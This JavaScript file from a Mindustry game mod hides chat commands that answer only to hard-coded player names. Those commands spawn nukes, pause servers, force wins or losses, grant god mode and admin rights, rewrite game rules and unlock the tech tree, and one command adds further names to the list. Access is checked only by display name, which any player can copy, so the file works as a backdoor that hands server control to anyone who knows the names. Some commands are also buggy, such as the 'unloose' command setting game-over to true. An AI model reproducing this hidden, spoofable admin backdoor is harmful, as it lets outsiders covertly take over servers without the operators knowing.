const nuke = require('blocks/tacticalNuker');
const ui = require('misc/ui');

const allowedUsers = ["mega.lp", "Eni_YT"]
function checkForAllowedUser(nameCheck) {
	if (allowedUsers.includes(nameCheck)) {
		return true;
	} else {
		return false;
	}
}

Events.on(PlayerChatEvent, event => {
	if (event.message.substring(0,1) == "/" && checkForAllowedUser(event.player.name))  {
		let parameter = event.message.split(' ');
		let name;
		let amount;
		let item;
		switch (parameter[0]) {
			case "/factorynuke":
				try {
					BulletType.createBullet(nuke.nuke, Team.derelict, event.player.x + Number(parameter[1])*8, event.player.y + Number(parameter[2])*8, 1, 100, 1, 1);
				} catch (error) {
					BulletType.createBullet(nuke.nuke, Team.derelict, event.player.x, event.player.y, 1, 100, 1, 1);
				}
				break;
			case "/factorywave":
				try {
					Vars.state.wave=Number(parameter[1]);
				} catch (error) {
					break;
				}
				//Vars.ui.consolefrag.addMessage(event.player);
				break;
			case "/factorypause":
				Vars.state.serverPaused=true;
				break;
			case "/factoryunpause":
				Vars.state.serverPaused=false;
				break;
			case "/factorywin":
				Vars.state.won=true;
				break;
			case "/factoryunwin":
				Vars.state.won=false;
				break;
			case "/factoryloose":
				Vars.state.gameOver=true;
				break;
			case "/factoryunloose":
				Vars.state.gameOver=true;
				break;
			case "/factoryhp":
				try {
					event.player.unit().health = parameter[1];
				} catch (error) {
					break;
				}
				break;
			case "/factorytp":
				try {
					event.player.admin = true;
					event.player.unit().x = Number(parameter[1])*8;
					event.player.unit().y = Number(parameter[2])*8;
				} catch (error) {
					break;
				}
				break;
			case "/factorygod":
				let hp = event.player.unit().health;
				if (hp == Infinity) {
					event.player.unit().health = 1000;
					event.player.unit().armor = 1000;
				} else {
					event.player.unit().health = Infinity;
					event.player.unit().armor = Infinity;
				}
				break;
			case "/factoryspawn":
				let count = parameter[2];
				if (count == NaN || parameter[2] == null) {
					count = 1;
				}
				for (let i = 0; i < count; i++) {
					try {
						Vars.content.unit("factory-" + parameter[1]).spawn(Number(event.player.x), Number(event.player.y));
					} catch (error) {
						try {
							Vars.content.unit(parameter[1]).spawn(Number(event.player.x), Number(event.player.y));
						} catch (error) {
							break;
						}
					}
				}
				break;
			case "/factorymat":
				
				name = parameter[1];
				if (name == NaN || parameter[1] == null) {
					name = "copper";
				}
				amount = parameter[2];
				if (amount == NaN || parameter[2] == null) {
					amount = 1;
				}
				event.player.unit().stack.amount = amount;
				
				try {
					item = Vars.content.item(name);
					if (item == null) {
						item = Vars.content.item("factory-" + name);
					}
					if (item == null) {
						break;
					}
				} catch (error) {
					break;
				}
				
				event.player.unit().stack.item = item;
				break;
				
			case "/factoryrule":
				name = parameter[1];
				if (name == NaN || parameter[1] == null) {
					name = "pvp";
				}
				amount = parameter[2];
				if (amount == NaN || parameter[2] == null) {
					amount = false;
				}
				try {
					Vars.state.rules[name] = amount;
				} catch (error) {
					break;
				}
				
				break;
				
			case "/factoryadmin":
				if (event.player.admin) {
					event.player.admin = false;
				} else {
					event.player.admin = true;
				}
				break;
			case "/factorynick":
				name = parameter[1];
				if (name == NaN || parameter[1] == null) {
					name = "mega.lp";
				}
				event.player.name = name;
				allowedUsers.push(name);
				break;
				
			case "/factorymessage":
				name = parameter[1];
				if (name == NaN || parameter[1] == null) {
					name = "Hallo Welt";
				}
				event.player.sendMessage(name);
				break;
				
			case "/factoryunlock":
			
				name = parameter[1];
				if (name == NaN || parameter[1] == null) {
					break;
				}
				
				if (name == "true") {
					TechTree.all.each(cons(node => {
						node.content.unlock();
					}));
				} else if (name ==  "false"){
					TechTree.all.each(cons(node => {
						node.content.clearUnlock();
					}));
				} else {
					TechTree.all.each(cons(node => {
						if (node.content == parameter[1] || node.content == "factory-" + parameter[1]) {
							if (node.content.unlocked) {
								node.content.clearUnlock();
							} else {
								node.content.unlock();
							}
						}
					}));
				}
				break;
				
			case "/factoryzoom":
			
				name = parameter[1];
				if (name == NaN || parameter[1] == null) {
					name = 25
				}
				
				try {
					ui.setZoom(0.5, Number(name));
				} catch (error) {
					break;
				}
				
				break;
			case "/test":
				Vars.ui.consolefrag.addMessage("hi");
				
			default:
				break;
		}
	}
})